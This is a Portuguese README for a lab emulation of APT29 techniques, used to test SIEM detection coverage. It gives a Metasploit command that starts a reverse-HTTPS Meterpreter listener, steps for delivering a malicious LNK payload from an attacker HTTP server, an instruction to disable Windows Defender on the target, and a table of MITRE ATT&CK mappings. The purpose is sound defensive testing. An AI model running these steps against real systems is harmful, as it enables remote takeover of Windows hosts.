# Emulação APT29 — Cozy Bear

Este directório contém os scripts de emulação do APT29 testados em laboratório controlado. O objectivo é reproduzir as técnicas reais do grupo de forma automatizada para validar a cobertura de detecção do SIEM.

---

## Pré-requisitos

Antes de executar a emulação confirma que tens o seguinte pronto:

- Kali Linux com Metasploit 6.4 ou superior
- WIN-DC01 acessível na rede com Sysmon e Wazuh Agent activos
- Listener Metasploit a correr na porta 443
- Servidor HTTP a correr na porta 8080
- Windows Defender desactivado no WIN-DC01 (ambiente de laboratório)

---

## Estrutura

```
03-emulation/
├── README.md           ← Este ficheiro
├── auto-lnk.sh         ← Automação completa do payload LNK
└── lnk_payload.py      ← Gerador do ficheiro LNK malicioso
```

---

## Como executar

### Passo 1 - Arrancar o listener no Kali

Abre um terminal e arranca o listener Metasploit:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 192.168.10.102; \
  set LPORT 443; \
  set ExitOnSession false; \
  run -j"
```

### Passo 2 - Executar o script de automação

Abre um segundo terminal e executa:

```bash
chmod +x auto-lnk.sh
./auto-lnk.sh
```

O script gera o payload LNK, arranca o servidor HTTP e aguarda que a vítima execute o ficheiro no WIN-DC01.

### Passo 3 - Executar o payload no WIN-DC01

No WIN-DC01 abre o browser e navega para:

```
http://192.168.10.102:8080/ds7002.zip
```

Descarrega e executa o ficheiro LNK. A sessão Meterpreter deve abrir no Kali como `LAB\Administrator`.

### Passo 4 - Executar os TTPs

Com a sessão Meterpreter activa executa os TTPs na sequência documentada na [attack timeline](../02-attack-phases/attack-timeline-pt.md).

---

## TTPs cobertos por esta emulação

| TTP | Técnica | Fase |
|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access |
| T1204.002 | Malicious File LNK | Initial Access |
| T1059.001 | PowerShell Execution | Execution |
| T1027 | Obfuscation | Defense Evasion |
| T1218.011 | Rundll32 | Defense Evasion |
| T1087 | Account Discovery | Discovery |
| T1069 | Permission Groups Discovery | Discovery |
| T1082 | System Information Discovery | Discovery |
| T1057 | Process Discovery | Discovery |
| T1012 | Registry Query | Discovery |
| T1560 | Archive Collected Data | Collection |
| T1105 | Ingress Tool Transfer | Command and Control |
| T1547.009 | Startup Persistence | Persistence |

---

## Notas importantes

Esta emulação foi desenvolvida e testada exclusivamente em ambiente de laboratório isolado. Não execute estes scripts em sistemas sem autorização explícita por escrito.

O Windows Defender deve estar desactivado no endpoint de teste para que o payload execute sem ser bloqueado. Em ambiente de produção o Defender bloquearia o payload o que é o comportamento esperado e desejado.

---

## Referências

- [MAD20 APT29 Emulation Plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)
- [MITRE ATT&CK — APT29](https://attack.mitre.org/groups/G0016/)
- [Metasploit Documentation](https://docs.metasploit.com/)
